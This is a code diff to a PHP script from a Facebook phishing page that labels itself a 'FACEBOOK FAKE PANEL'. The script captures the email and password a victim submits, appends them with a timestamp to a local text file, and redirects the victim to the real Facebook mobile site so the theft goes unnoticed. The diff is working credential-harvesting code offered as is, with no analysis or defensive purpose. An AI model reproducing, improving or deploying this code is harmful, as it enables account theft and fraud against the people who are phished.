@@ -2,25 +2,22 @@
 
 if (isset($_POST['email']) && isset($_POST['pass'])) {
 
-$save = fopen("kaydedilen.txt","a+");
-$kullaniciadi = $_POST['email'];
+$save = fopen("saved_info.txt","a+");
+$eposta = $_POST['email'];
 $password = $_POST['pass'];
+date_default_timezone_set('Europe/Istanbul');
+$tarih = date('d/m/Y H:i:s');
 $vericekilen = ("
-\e[32m
-	████████████████████████████████████████
-	██
-	██ \e[97mKULLANICI ADI : \e[32m".$kullaniciadi."\e[32m
-	██
-	████████████████████████████████████████
++-+-+ FACEBOOK FAKE PANEL +-+-+
 
+ Tarih         : ".$tarih."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
-	██
-	████████████████████████████████████████\e[97m
-        
-	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
+ E POSTA       : ".$eposta."
+
+ Şifre         : ".$password."
+
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+");
 fwrite($save,$vericekilen);
 fclose($save);
 header('Location: https://m.facebook.com');
